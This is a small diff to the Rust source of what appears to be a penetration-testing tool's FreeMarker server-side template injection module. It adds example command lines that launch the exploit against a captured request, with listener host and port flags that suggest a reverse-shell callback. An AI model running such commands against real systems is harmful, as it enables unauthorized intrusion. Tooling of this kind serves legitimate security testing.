@@ -56,6 +56,10 @@ impl WebModule for FreemarkerModule {
                 "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker".to_string(),
                 "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java".to_string(),
             ],
+            examples: vec![
+                "cap web run --module web/ssti/freemarker --request ./requests/template.req --injection-point content --lhost 10.10.14.5 --lport 4444".to_string(),
+                "cap web run --module web/ssti/freemarker --request ./requests/template.req --injection-point content --lhost 10.10.14.5 --lport 4444 --dry-run".to_string(),
+            ],
         }
     }
     
